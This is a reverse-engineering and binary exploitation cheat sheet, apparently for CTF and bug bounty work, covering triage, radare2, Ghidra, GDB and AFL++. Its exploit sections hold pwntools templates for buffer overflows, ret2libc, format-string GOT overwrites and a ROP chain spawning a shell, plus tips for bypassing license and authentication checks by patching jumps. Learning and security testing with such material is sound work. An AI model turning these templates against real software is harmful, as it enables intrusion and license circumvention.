# Binary / ELF / PE / x86 — Reverse Engineering & Exploit Dev

## Phase 1: Triage (Always First)

```bash
# File type and architecture
file ./binary
# ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped

# Security mitigations
checksec --file=./binary
# Output:
# RELRO:    Full / Partial / No
# Stack:    Canary found / No canary
# NX:       enabled / disabled
# PIE:      enabled / No PIE
# FORTIFY:  Yes / No

# Strings (quickest intel)
strings ./binary | grep -iE "(pass|key|flag|secret|token|exec|http|admin|debug)"
strings ./binary | grep -E "[A-Za-z0-9+/]{30,}"   # high-entropy (potential secrets)

# Imports (what syscalls/libs does it use?)
objdump -p ./binary | grep NEEDED   # shared libraries
nm -D ./binary                       # dynamic symbols
readelf -s ./binary                  # all symbols
ltrace ./binary                      # library calls at runtime
strace ./binary                      # syscalls at runtime

# Dependencies
ldd ./binary
```

## Phase 2: Static Analysis

### Radare2 Workflow
```bash
r2 ./binary

# Inside r2:
[0x00400000]> aaa          # analyze all (thorough)
[0x00400000]> afl          # list all functions
[0x00400000]> afl | grep -i "main\|auth\|check\|valid\|flag\|key"
[0x00400000]> pdf @ main   # disassemble main
[0x00400000]> pdf @ sym.check_password
[0x00400000]> VV @ main    # visual graph mode (q to exit)
[0x00400000]> iz            # strings with addresses
[0x00400000]> izz           # all strings
[0x00400000]> ii            # imports
[0x00400000]> is            # symbols
[0x00400000]> /c strcmp     # find calls to strcmp
[0x00400000]> axf @ sym.imp.strcmp  # cross-refs to strcmp

# Search for patterns
[0x00400000]> / password    # search string in binary
[0x00400000]> /x 90909090   # search bytes (NOP sled)
[0x00400000]> /R pop rdi    # find ROP gadgets with pop rdi

# Script r2 (non-interactive)
r2 -q -c "aaa; afl; pdf @ main" ./binary
r2 -q -c "iz" ./binary | grep -i "secret\|flag\|pass"
```

### Ghidra Headless
```bash
# Headless analysis (no GUI)
ghidra-analyzeHeadless /tmp/ghidra-proj TARGET \
  -import ./binary \
  -postScript DecompileAllFunctions.java \
  -log /tmp/ghidra.log

# With custom script to extract function names
ghidra-analyzeHeadless /tmp/p PROJ -import ./binary \
  -postScript "PrintFunctionNames.java" \
  -deleteProject

# GUI workflow:
# 1. File → Import File → binary
# 2. Run auto-analysis (yes to all)
# 3. Window → Functions → sort by name
# 4. Look for: check, validate, auth, decrypt, key, flag, admin
# 5. Use Ctrl+Shift+F → search all decompiled code
# 6. Check cross-references: right-click → References → Find Uses
```

## Phase 3: Dynamic Analysis

### GDB / PWNDBG
```bash
# Install pwndbg (best GDB plugin)
git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh

# Basic session
gdb -q ./binary
(gdb) info functions             # all function names
(gdb) break main                 # breakpoint at main
(gdb) run < <(python3 -c "print('A'*200)")  # fuzz with long input
(gdb) x/50x $rsp                 # examine stack
(gdb) x/s $rdi                   # examine string in rdi
(gdb) info registers             # all registers
(gdb) bt                         # backtrace (if crashed)
(gdb) x/i $rip                   # current instruction

# Find crash offset (pwndbg)
cyclic 200                        # generate De Bruijn pattern
# → crash → read RIP value → 
cyclic -l 0x6161616f              # find offset = 44

# Pattern with pwntools
python3 -c "from pwn import *; print(cyclic(200).decode())"
```

### Runtime Tracing
```bash
# Library calls
ltrace -s 256 ./binary < input.txt

# Syscalls
strace ./binary < input.txt 2>&1 | grep -E "open|read|write|exec"

# Observe specific function
ltrace -e strcmp ./binary        # trace all strcmp calls → see what's compared!
ltrace -e memcmp ./binary
```

## Phase 4: Vulnerability Classes

### Buffer Overflow
```python
from pwn import *

e = ELF('./binary')
r = process('./binary')

# 1. Find offset
payload = cyclic(200)
r.sendline(payload)
r.wait()

core = r.corefile
offset = cyclic_find(core.rip)  # or core.eip for 32-bit

# 2. Basic ret2win (no PIE, no ASLR)
win_addr = e.symbols['win']  # or get from Ghidra
payload = b'A' * offset + p64(win_addr)
r.sendline(payload)
r.interactive()

# 3. ret2libc (NX enabled, no PIE)
rop = ROP(e)
rop.puts(e.got['puts'])        # leak puts address
rop.main()                     # return to main
r.sendline(b'A'*offset + bytes(rop))
leaked = u64(r.recvuntil(b'\n').strip().ljust(8, b'\x00'))
libc_base = leaked - libc.sym['puts']
```

### Format String Exploitation
```python
# Detect: binary prints user input without format specifier
# printf(user_input)  vs  printf("%s", user_input)

# Leak stack values
payload = b"%p." * 20          # leak 20 stack pointers
r.sendline(payload)
# Look for: heap pointers, canary (8+ byte value ending in 00), libc addresses

# Overwrite GOT entry (if RELRO=Partial)
from pwn import fmtstr_payload
payload = fmtstr_payload(offset, {e.got['exit']: win_addr})
```

### Heap Exploitation
```bash
# Use After Free, Double Free, Heap Overflow
# Tools:
valgrind --leak-check=full --track-origins=yes ./binary
# AddressSanitizer:
gcc -fsanitize=address ./target.c -o target_asan && ./target_asan
```

### ROP Chain
```python
# NX enabled, no gadget in binary → use libc gadgets
from pwn import *

e = ELF('./binary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP([e, libc])

# Common chain: pop rdi; ret → system("/bin/sh")
rop.call(rop.ret)                     # stack alignment (16-byte)
rop.call(libc.sym['system'], [next(libc.search(b'/bin/sh'))])

# Find gadgets manually
ROPgadget --binary ./binary | grep "pop rdi"
ropper -f ./binary --search "pop rdi"
```

## Phase 5: Bug Bounty Binary Targets

### What to Look For in Bug Bounty Binaries
```
1. Authentication bypass in command-line tools
   → Compare against hardcoded hash/string
   → Patch jump condition: je → jne in binary

2. Hardcoded secrets in compiled binaries
   → strings ./binary | grep -iE "(key|token|secret|password)"
   → Radare2: iz | grep -i "key"

3. License check bypass
   → Find: strcmp(license_input, hardcoded_key)
   → Either extract key from binary or patch check

4. Memory corruption in parsers (file format handlers)
   → Fuzz with AFL++: afl-fuzz -i seeds -o output -- ./binary @@
   → Look for: image parsers, PDF readers, archive extractors

5. Command injection in scripts/tools
   → Check if binary calls system() with user-controlled data
   → ltrace: trace system() calls → inject via filename/env
```

### AFL++ Fuzzing
```bash
# Compile with instrumentation
CC=afl-clang-fast CXX=afl-clang-fast++ ./configure
make

# Or use QEMU mode for pre-built binaries
afl-fuzz -Q -i seeds/ -o output/ -- ./binary @@

# Multi-core
afl-fuzz -M fuzzer01 -i seeds -o out -- ./binary @@
afl-fuzz -S fuzzer02 -i seeds -o out -- ./binary @@

# Monitor
afl-whatsup output/
```

### checksec Output Interpretation
```
RELRO Full    → GOT is read-only, no GOT overwrite attacks
RELRO Partial → GOT writable, can overwrite with format string
No RELRO      → Easy GOT overwrite

Stack Canary  → Buffer overflow needs leak first
No Canary     → Direct buffer overflow → RIP control

NX enabled    → No shellcode on stack, need ROP
NX disabled   → Can inject shellcode

PIE enabled   → All addresses randomized → need leak first  
No PIE        → Binary at fixed address, no leak needed

FORTIFY Yes   → Some dangerous functions replaced with safe versions
```
